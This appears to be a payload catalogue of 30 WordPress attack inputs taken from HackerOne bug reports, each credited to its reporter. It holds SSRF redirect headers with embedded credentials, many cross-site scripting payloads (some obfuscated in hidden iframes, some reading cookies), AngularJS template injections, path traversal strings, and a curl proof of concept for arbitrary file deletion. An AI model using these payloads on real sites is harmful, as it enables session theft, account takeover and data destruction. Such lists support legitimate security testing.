# WordPress

30 payloads.

### `e92a92b1`

```
Location: http://192.168.0.1:12345
```

— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)

### `671c6fd1`

```
Location: http://admin:admin@192.168.0.1:12345
```

— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)

### `3a897c3e`

```
GET / HTTP/1.1
Host: 192.168.0.1:12345
Authorization: Basic YWRtaW46YWRtaW4=
User-Agent: Press This (WordPress/4.7-RC1);
Accept: */*
Accept-Encoding: deflate, gzip
Referer: http://admin:admin@192.168.0.1:12345/
Connection: close
```

— [Wordpress 4.7 - CSRF -> HTTP SSRF any private ip:port and basic-auth](https://hackerone.com/reports/187520) · WordPress · [skansing](https://hackerone.com/skansing)

### `504008e3`

```
Dinosaurs secret life<img src=x  onerror=alert(1)>.png
```

**Parameter:** `filename`
— [Wordpress 4.7.2 - Two XSS in Media Upload when file too large.](https://hackerone.com/reports/203515) · WordPress · [skansing](https://hackerone.com/skansing)

### `ed08cf65`

```
../../../../../../../../../../tmp/poc_file
```

— [Wordpress unzip_file path traversal](https://hackerone.com/reports/205481) · WordPress · [ajxchapman](https://hackerone.com/ajxchapman)

### `0bb162ee`

```
/* Template Name: <script>confirm(document.cookie);</script> */
```

**Parameter:** `Template Name comment`
— [Authenticated Cross-site Scripting in Template Name](https://hackerone.com/reports/220903) · WordPress · [zurke](https://hackerone.com/zurke)

### `bc5ee68b`

```
astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
```

— [XSS in the search bar of target.com](https://hackerone.com/reports/221893) · WordPress · [codertom](https://hackerone.com/codertom)

### `b993c028`

```
{{
c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
c.$apply=$apply;c.$eval=b;op=$root.$$phase;
$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
B=C(b,c,b);$evalAsync("
astNode=pop();astNode.type='UnaryExpression';
astNode.operator='(window.X?void0:(window.X=true,prompt(document.domain)))+';
astNode.argument={type:'Identifier',name:'foo'};
");
m1=B($$asyncQueue.pop().expression,null,$root);
m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
$ev
```

— [Stored but \[SELF\] XSS in target.com](https://hackerone.com/reports/222224) · WordPress · [codertom](https://hackerone.com/codertom)

### `e0803e81`

```
https://target.com/search/{{constructor.constructor('alert(document.domain)')()}}
```

**Parameter:** `search`
— [\[target.com\] Reflected XSS via AngularJS Template Injection](https://hackerone.com/reports/230234) · WordPress · [ysx](https://hackerone.com/ysx)

### `cfdd0b81`

```
https://target.com/product-category/apparel/?subcat=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

**Parameter:** `subcat`
— [DOM Based XSS In target.com](https://hackerone.com/reports/230435) · WordPress · [pabster](https://hackerone.com/pabster)

### `f2fef0fd`

```
&#123;&#123;constructor.constructor('alert(document.domain)')()}}
```

— [\[target.com\] Reflected XSS](https://hackerone.com/reports/240256) · WordPress · [zeeshank](https://hackerone.com/zeeshank)

### `51d03b25`

```
{{constructor.constructor(&#39;alert(document.domain)&#39;)()}}
```

— [\[target.com\] Reflected XSS](https://hackerone.com/reports/240256) · WordPress · [zeeshank](https://hackerone.com/zeeshank)

### `7fc4671d`

```
https://target.com/?s=%26%23123%3B%26%23123%3Bconstructor.constructor%28%27alert%28document.domain%29%27%29%28%29%7D%7D&post_type=product
```

**Parameter:** `s`
— [\[target.com\] Reflected XSS](https://hackerone.com/reports/240256) · WordPress · [zeeshank](https://hackerone.com/zeeshank)

### `30569b4b`

```
https://target.com/1player/tags/1.3/players/video-js/video-js.swf?readyFunction=alert(%27Hello%27
```

— [Reflected Swf XSS In ( target.com )](https://hackerone.com/reports/270060) · WordPress · [m7mdharoun](https://hackerone.com/m7mdharoun)

### `ac92311b`

```
<html><script>alert(document.domain)</script></html>
```

— [Stored XSS in WordPress](https://hackerone.com/reports/276105) · WordPress · [abdullah](https://hackerone.com/abdullah)

### `779e7596`

```
../../../../../../../var/tmp/content/../../../../../../home/user/html/wordpress/../../../../../../var/tmp/content
```

**Parameter:** `upload_path`
— [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) · WordPress · [simonscannell](https://hackerone.com/simonscannell)

### `40d26d5e`

```
../../../../../../../var/tmp/
```

**Parameter:** `upload_path`
— [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) · WordPress · [simonscannell](https://hackerone.com/simonscannell)

### `bb6fee8f`

```
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `d9abaf65`

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `cc472c51`

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `4f6666c8`

```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,5
```

— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `99244b35`

```
Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
```

**Parameter:** `message`
— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)

### `93d24943`

```
javascript&#3A;alert(1);
```

— [Stored XSS in Post Preview as Contributor](https://hackerone.com/reports/497724) · WordPress · [simonscannell](https://hackerone.com/simonscannell)

### `aec49bf5`

```
<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>
```

— [Potential unprivileged Stored XSS through wp_targeted_link_rel](https://hackerone.com/reports/509930) · WordPress · [simonscannell](https://hackerone.com/simonscannell)

### `d2195f7d`

```
<a href="accesskey=x onclick=alert(document .domain)//"></a>
```

**Parameter:** `group_name`
— [Stored XSS on byddypress Plug-in via groups name](https://hackerone.com/reports/592316) · WordPress · [yxw21](https://hackerone.com/yxw21)

### `fb8ba839`

```
https://target.com/chat/logs?channel=16%22%3E%3Cimg%20src=x%20onerror=alert(document.domain
```

**Parameter:** `channel`
— [Reflected XSS on https://target.com via 'channel' parameter](https://hackerone.com/reports/659419) · WordPress · [gnux](https://hackerone.com/gnux)

### `ebba0511`

```
<script>
if(document.location.hash.indexOf("secret") != -1) {
  secret = document.location.hash.split("=")[1];
  window.top.postMessage({"secret":secret,"message":"link","value":"javascript://"+document.location.host+"/%0aalert(document.domain);//"},"*");
}
</script>
```

— [wp-embed XSS on Safari](https://hackerone.com/reports/1238528) · WordPress · [zoczus](https://hackerone.com/zoczus)

### `6d810f40`

```
{"sub_sizes":[{"image_size":"thumbnail",
  "file":"a.jpg' /><svg onload='document.title=\"XSS-EXECUTED-\"+document.domain'></svg><b x='",
  "width":150,"height":150,"mime_type":"image/jpeg","filesize":1}]}
```

**Parameter:** `file`
— [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)

### `af53af77`

```
<svg onload=…>
```

— [Author → stored XSS in wp-admin: unescaped sub-size filename from attachment metadata breaks out of the `src` attribute in `get_media_item()`](https://hackerone.com/reports/3931771) · WordPress · [jakubk](https://hackerone.com/jakubk)

### `7680439f`

```
AP=<author1 application password>
B=http://localhost:8356

# [1] Author uploads a real JPEG
curl -u "author1:$AP" -H "Content-Disposition: attachment; filename=zap4.jpg" \
     -H "Content-Type: image/jpeg" --data-binary @zap.jpg \
     -X POST "$B/?rest_route=/wp/v2/media"                       # 201, id=8

# [2] Poison one sub-size filename with the name of the file to destroy
curl -u "author1:$AP" -X POST -H "Content-Type: application/json" \
  -d '{"sub_sizes":[{"image_size":"thumbnail","fil
```

**Parameter:** `file`
— [Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata`](https://hackerone.com/reports/3931777) · WordPress · [jakubk](https://hackerone.com/jakubk)
